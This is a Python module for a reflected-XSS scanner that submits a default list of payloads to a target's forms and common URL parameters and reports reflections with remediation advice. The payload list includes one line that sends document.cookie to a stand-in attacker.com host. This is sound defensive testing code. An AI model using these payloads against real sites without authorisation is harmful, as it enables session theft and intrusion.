# -*- coding: utf-8 -*-
import asyncio
from datetime import datetime
from typing import List, Dict
import httpx
import re
from backend.scanners.base_scanner import BaseScanner
from backend.scanners.scanner_registry import ScannerRegistry
from backend.types.models import ScanInput, Severity, OwaspCategory
from backend.utils.circuit_breaker import circuit_breaker
from backend.utils.logging_config import get_context_logger

logger = get_context_logger(__name__)

class XssScanner(BaseScanner):
    """
    A scanner module for detecting Cross-Site Scripting (XSS) vulnerabilities.
    """

    metadata = {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Detects potential XSS vulnerabilities by searching for script tags and unescaped user input.",
        "owasp_category": "A03:2021 - Injection",
        "author": "Project Nightingale Team",
        "version": "1.0"
    }

    @circuit_breaker(failure_threshold=3, recovery_timeout=30.0, name="xss_scanner")
    async def scan(self, scan_input: ScanInput) -> List[Dict]:
        """
        This is the entry point for the scanner. It will delegate to the
        private _perform_scan method. The boilerplate for logging, metrics,
        and broadcasting is handled by higher-level components.
        """
        return await self._perform_scan(scan_input.target, scan_input.options or {})

    async def _perform_scan(self, target: str, options: Dict) -> List[Dict]:
        """
        Perform the actual XSS vulnerability scan.
        """
        findings: List[Dict] = []
        logger.info("Starting XSS scan", extra={"target": target})

        test_payloads = options.get('payloads', [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            'javascript:alert(1)',
            '"><script>fetch(`http://attacker.com?cookie=${document.cookie}`)</script>'
        ])

        test_params = options.get('parameters', [
            'q', 'search', 'id', 'input', 'query', 'keyword',
            'name', 'user', 'username', 'email', 'message',
            'comment', 'content', 'text', 'data'
        ])

        try:
            async with httpx.AsyncClient(timeout=30) as client:
                response = await client.get(target)
                content = response.text

                forms = re.findall(r'<form[^>]*>.*?</form>', content, re.DOTALL)
                
                for form in forms:
                    form_action_match = re.search(r'action=["\']([^"\']*)["\']', form)
                    form_method_match = re.search(r'method=["\']([^"\']*)["\']', form)

                    if form_action_match:
                        form_url = form_action_match.group(1)
                        if not form_url.startswith(('http://', 'https://')):
                            form_url = f"{target.rstrip('/')}/{form_url.lstrip('/')}"

                        method = form_method_match.group(1).upper() if form_method_match else 'POST'

                        for payload in test_payloads:
                            try:
                                if method == 'GET':
                                    # Assuming the first test_param is the most likely for GET forms
                                    test_url = f"{form_url}?{test_params[0]}={payload}"
                                    response = await client.get(test_url)
                                else:
                                    data = {param: payload for param in test_params}
                                    response = await client.post(form_url, data=data)

                                if payload in response.text:
                                    logger.info("Potential XSS vulnerability detected in form", extra={
                                        "url": form_url,
                                        "method": method,
                                        "payload": payload
                                    })
                                    findings.append({
                                        "type": "reflected_xss",
                                        "severity": Severity.HIGH,
                                        "title": "Reflected XSS Vulnerability",
                                        "description": f"Found reflected XSS vulnerability in form submission to {form_url}",
                                        "evidence": {
                                            "url": form_url,
                                            "method": method,
                                            "payload": payload,
                                            "reflection": response.text[:200]
                                        },
                                        "owasp_category": OwaspCategory.INJECTION,
                                        "remediation": "Implement proper input validation and output encoding. Use Content-Security-Policy headers and consider using a Web Application Firewall (WAF)."
                                    })
                            except Exception as e:
                                logger.warning("Error testing XSS payload for form", extra={
                                    "url": form_url,
                                    "payload": payload,
                                    "error": str(e)
                                })
                                continue

                for param in test_params:
                    for payload in test_payloads:
                        try:
                            test_url = f"{target}?{param}={payload}"
                            response = await client.get(test_url)

                            if payload in response.text:
                                logger.info("Potential XSS vulnerability detected in URL parameter", extra={
                                    "url": test_url,
                                    "parameter": param,
                                    "payload": payload
                                })
                                findings.append({
                                    "type": "reflected_xss",
                                    "severity": Severity.HIGH,
                                    "title": "Reflected XSS in URL Parameter",
                                    "description": f"Found reflected XSS in '{param}' parameter",
                                    "evidence": {
                                        "url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "reflection": response.text[:200]
                                    },
                                    "owasp_category": OwaspCategory.INJECTION,
                                    "remediation": "Implement proper input validation and output encoding. Use Content-Security-Policy headers and consider using a Web Application Firewall (WAF)."
                                })
                        except Exception as e:
                            logger.warning("Error testing XSS payload for URL parameter", extra={
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "error": str(e)
                            })
                            continue
        except Exception as e:
            logger.error("Unexpected error during XSS scan", extra={
                "target": target,
                "error": str(e)
            }, exc_info=True)

        logger.info("Finished XSS scan", extra={
            "target": target,
            "findings_count": len(findings)
        })
        return findings